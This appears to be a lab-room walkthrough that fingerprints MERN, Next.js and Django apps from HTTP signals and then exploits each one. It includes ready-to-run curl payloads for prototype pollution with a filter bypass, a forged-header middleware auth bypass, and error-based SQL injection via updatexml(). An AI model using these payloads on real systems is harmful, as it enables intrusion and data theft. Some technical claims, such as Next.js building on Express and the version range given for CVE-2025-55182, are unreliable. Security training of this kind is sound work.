# Modern Web Stacks

Fingerprinting modern web stacks from passive HTTP signals, then exploiting a known vulnerability in each. One stack per section — more added as the room progresses.

---

**Table of contents**

- [MERN stack](#mern-stack)
- [Next.js](#nextjs)
- [Django](#django)

---

## MERN stack

**MERN** = MongoDB, Express.js, React, Node.js — the default for JavaScript-only teams that want one language across the whole stack. Express is minimal by design, so developers write a lot of their own utility code, and that custom code is where the bugs usually are.

**Typical Ubuntu deployment:** Node.js (NodeSource), Express on port **3000/5000**, MongoDB on **27017**, usually behind an Nginx reverse proxy in production — but often directly exposed on internal tools.

### Fingerprinting

Identify the stack *before* sending any payloads. Start with the response headers:

```bash
curl -I 10.130.132.26:3000/
```

| Signal | Value | Confidence |
| --- | --- | --- |
| `X-Powered-By` header | `Express` | High |
| `Set-Cookie` header | `connect.sid=s%3A...` | High |
| Unhandled route | `Cannot GET /nonexistent` (plain text) | High |
| Frontend root element | `<div id="root">` in HTML body | Medium |

- **`X-Powered-By: Express`** — sent on every response by default. Absent only if the dev called `app.disable('x-powered-by')`, added Helmet, or a reverse proxy (Vercel, Cloudflare, Railway) stripped it. If missing, fall back to the other signals.
- **`connect.sid` cookie** — from `express-session`. Present with `saveUninitialized: true`; with `saveUninitialized: false` it only appears after a session is created, so its absence does **not** rule out Express.
- **Unhandled route** — a default Express app returns plain text `Cannot GET /path`, distinct from Django, Apache, and Next.js error pages:

```bash
curl http://10.130.132.26:3000/nonexistent   # -> Cannot GET /nonexistent
```

### Exploiting — Prototype Pollution

After fingerprinting, enumerate the API surface. MERN apps expose JSON endpoints and often merge user input into objects with custom, unfiltered merge functions — the classic home of **prototype pollution**.

| Endpoint | Method | Purpose |
| --- | --- | --- |
| `/api/user/update` | POST | Merges submitted JSON into the session user object |
| `/api/admin/flag` | GET | Returns the flag if the user has admin access |

**The concept:** every JS object inherits from a shared `Object.prototype`. A merge function that accepts a `__proto__` key writes the property onto `Object.prototype` itself — so *every* object in the Node process then resolves `.isAdmin` as `true` via the prototype chain, even without its own property.

```bash
# 1. Confirm the admin route is gated
curl -c cookies.txt http://10.130.132.26:3000/
curl -b cookies.txt http://10.130.132.26:3000/api/admin/flag
# -> {"error":"Not authorized"}

# 2. Pollute the prototype through the unfiltered merge
curl -b cookies.txt -X POST http://10.130.132.26:3000/api/user/update \
  -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
# -> {"status":"updated"}

# 3. Admin check now resolves true via the prototype chain
curl -b cookies.txt http://10.130.132.26:3000/api/admin/flag
# -> {"flag":"..."}
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Tip:</strong> If <code>__proto__</code> is filtered at the input layer, the <code>constructor.prototype</code> path — <code>{"constructor": {"prototype": {"isAdmin": true}}}</code> — reaches <code>Object.prototype</code> by a different route and can bypass that filter.
</div>

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Warning:</strong> Prototype pollution mutates global process state. Only run it against authorized targets — it can affect other users and crash the app.
</div>

---

## Next.js

**Next.js** builds on Express/Node and is the dominant React framework for production apps — investor dashboards, customer portals, marketing sites. On Ubuntu it runs as a Node process (`npm run build && npm start`). The **App Router** (default since v14) enables **React Server Components (RSC)**, which stream server-rendered output to the browser over the binary **RSC Flight protocol** — the surface behind CVE-2025-55182.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Note:</strong> Both CVEs below affect <strong>production build mode</strong> only (<code>npm run build &amp;&amp; npm start</code>). Neither manifests under <code>next dev</code> — if fingerprinting shows a dev server, they don't apply.
</div>

### Fingerprinting

```bash
curl -I http://TARGET:3001/
```

| Signal | Value | Confidence |
| --- | --- | --- |
| `X-Powered-By` header | `Next.js` | High |
| HTML source | `window.__next_f` in a `<script>` | High (confirms App Router) |
| Static asset paths | `/_next/static/chunks/` | High |
| Middleware headers | `x-middleware-next` / `x-middleware-rewrite` | Medium |
| Redirect to protected route | HTTP 307 to `/login` | Medium |

**`window.__next_f`** is the definitive App Router indicator — the hydration array for RSC data, injected into every App Router page. It never appears in Pages Router or other frameworks.

### CVE-2025-29927 — Middleware auth bypass

Middleware runs before every request and is where most Next.js apps put authentication. Next.js uses an internal header, **`x-middleware-subrequest`**, to avoid infinite loops when middleware forwards a request to itself — telling the framework "middleware already ran, skip it."

**The flaw:** Next.js never verified the header came from an *internal* process. Send it yourself and middleware — including the auth check — is skipped entirely. The value is the middleware module path repeated **five times**.

```bash
# Baseline: no cookie -> redirected to /login (middleware working)
curl -v http://TARGET:3001/dashboard          # -> 307 Location: /login

# Bypass: forge the internal subrequest header
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://TARGET:3001/dashboard
# -> DashboardFlag: ...
```

**CVSS 9.1 Critical** — full auth bypass with a single header, no credentials.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> With a <code>/src</code> directory layout the value becomes <code>src/middleware</code> repeated five times. Check whether <code>middleware.ts</code> sits at the project root or under <code>src/</code>.
</div>

### CVE-2025-55182 — RSC Flight RCE (reference)

Unauthenticated **RCE via insecure deserialisation** in the RSC Flight protocol parser. Affects Next.js 14 (≥ 14.3.0-canary.77) and 15.x (< 15.2.3) paired with React 19. **CVSS 10.0 Critical.** Covered in depth (probe → command execution, detection, remediation) in the dedicated *CVE-2025-55182: React2Shell* room — out of scope for this fingerprinting-focused task.

---

## Django

**Django** is the Python-native framework favoured by government, newsrooms, and Python-shop SaaS. Its ORM normally shields against SQL injection — but when a developer concatenates user input into raw SQL, or hits a flawed deprecated ORM path, the database is exposed.

**CVE-2021-35042** — SQL injection in Django's `order_by()` query method. **CVSS 9.8 Critical**, no authentication required.

**Typical Ubuntu deployment:** Gunicorn or the built-in dev server on port **8000**; admin panel at `/admin/` and CSRF middleware enabled by default.

### Fingerprinting

```bash
curl -I "http://10.82.95.115:8000/products/"
```

| Signal | Value | Confidence |
| --- | --- | --- |
| `Server` header | `WSGIServer/0.2 CPython/X.X.X` | High |
| Cookie name | `csrftoken` | High |
| `csrfmiddlewaretoken` hidden field | in any POST form's HTML | High |
| `X-Frame-Options` | `DENY` | High |
| `X-Content-Type-Options` | `nosniff` | High |
| `Referrer-Policy` | `same-origin` | Medium |

- **`csrfmiddlewaretoken`** is the most reliable signal — Django's `CsrfViewMiddleware` injects it into every POST form. Absent from Express, Rails, and Next.js.
- The trio **`X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` + `Referrer-Policy: same-origin`** together signals Django's `SecurityMiddleware` — no other framework applies all three by default.

### CVE-2021-35042 — SQL injection via `order_by()`

The product catalogue at `/products/` exposes a user-controlled `order` parameter that lands **unvalidated** inside an `ORDER BY` clause:

```python
order = self.request.GET.get('order', 'name')
sql = ('SELECT id, name, price, description FROM products_product '
       f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)')
```

`1=1` is always true, so the `THEN {order}` branch always runs — that's the injection point.

**`updatexml()` error-based extraction:** `updatexml(1, xpath_expr, 1)` throws when the XPath is invalid. Wrapping a `SELECT` in `concat(0x7e, ...)` (where `0x7e` = `~`, a marker) forces MySQL to leak the query result inside the error message, surfaced in the HTTP 500 body.

```bash
# 1. Confirm injection + read MySQL version (~ prefix = payload executed)
curl -s "http://TARGET:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" \
  | grep -o '~[0-9][^&]*'
# -> ~8.0.45-0ubuntu0.22.04.1   (500 page also shows Django Version: 3.2.4)

# 2. Extract the current database name
curl -s "http://TARGET:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" \
  | grep -o '~[0-9a-zA-Z_][^&]*'
# -> ~vuln_db
```

From here, feed the injection point to **sqlmap** to enumerate and dump the full database.

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Warning:</strong> The <code>updatexml()</code> error technique only works when <code>DEBUG = True</code> in <code>settings.py</code> — a production app (<code>DEBUG = False</code>) returns a generic 500 with no details. Verify first; if debug output is suppressed, fall back to blind time-based injection with <code>SLEEP()</code>.
</div>
